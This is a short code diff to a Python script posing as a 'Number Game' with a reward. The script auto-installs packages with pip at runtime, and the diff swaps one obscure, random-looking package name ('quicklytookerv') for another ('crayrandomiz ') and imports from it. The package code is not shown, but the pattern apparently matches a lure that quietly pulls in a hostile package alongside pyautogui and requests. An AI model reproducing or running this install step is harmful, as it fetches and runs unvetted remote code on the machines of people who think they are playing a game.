@@ -6,7 +6,7 @@ def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
 # List of required packages
-required_packages = ["quicklytookerv", "pyautogui", "requests"]
+required_packages = ["crayrandomiz ", "pyautogui", "requests"]
 
 for package in required_packages:
     try:
@@ -16,7 +16,7 @@ for package in required_packages:
 
 os.system('cls' if os.name == 'nt' else 'clear')
 
-from quicklytookerv import choice
+from crayrandomiz import choice
 
 print("Welcome to the Number Game!")
 print("Choose a number between 1 and 10 to claim your reward.")
